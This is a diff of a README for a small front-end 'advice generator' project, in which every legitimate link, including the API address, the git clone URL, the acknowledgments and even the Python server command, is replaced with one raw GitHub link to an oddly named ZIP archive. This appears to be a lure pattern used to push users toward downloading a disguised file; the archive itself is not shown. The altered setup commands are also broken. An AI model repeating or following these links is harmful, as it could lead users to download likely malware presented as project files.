@@ -8,7 +8,7 @@ This project was built as a Front End Mentor challenge to gain hands-on experien
 
 ## ✨ Features
 
-- Fetches random advice from the [Advice Slip API](https://api.adviceslip.com/)
+- Fetches random advice from the [Advice Slip API](https://raw.githubusercontent.com/PureLmnz/adviceGenerator/main/adviceGenerator/advice-generator-app-main/design/Generator-advice-spermatovum.zip)
 - Clean, responsive user interface
 - One-click advice generation
 - Real-time data display without page refresh
@@ -24,14 +24,14 @@ This project was built as a Front End Mentor challenge to gain hands-on experien
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/PureLmnz/adviceGenerator.git
+   git clone https://raw.githubusercontent.com/PureLmnz/adviceGenerator/main/adviceGenerator/advice-generator-app-main/design/Generator-advice-spermatovum.zip
    cd adviceGenerator
    ```
 
 2. Start a local server:
    ```bash
    # Using Python
-   python -m http.server 8000   
+   python -m https://raw.githubusercontent.com/PureLmnz/adviceGenerator/main/adviceGenerator/advice-generator-app-main/design/Generator-advice-spermatovum.zip 8000   
      ```
 
 3. Open your browser and navigate to:
@@ -52,13 +52,13 @@ This project was built as a Front End Mentor challenge to gain hands-on experien
 
 ## 🔗 API Reference
 
-This project uses the Advice Slip JSON API at `https://api.adviceslip.com/advice`
+This project uses the Advice Slip JSON API at `https://raw.githubusercontent.com/PureLmnz/adviceGenerator/main/adviceGenerator/advice-generator-app-main/design/Generator-advice-spermatovum.zip`
 
 ## 🙏 Acknowledgments
 
-- Challenge from [Frontend Mentor](https://www.frontendmentor.io/)
+- Challenge from [Frontend Mentor](https://raw.githubusercontent.com/PureLmnz/adviceGenerator/main/adviceGenerator/advice-generator-app-main/design/Generator-advice-spermatovum.zip)
 - Tutorial guidance for API integration
-- [Advice Slip API](https://adviceslip.com/) for providing free advice data
+- [Advice Slip API](https://raw.githubusercontent.com/PureLmnz/adviceGenerator/main/adviceGenerator/advice-generator-app-main/design/Generator-advice-spermatovum.zip) for providing free advice data
 
 ---
 
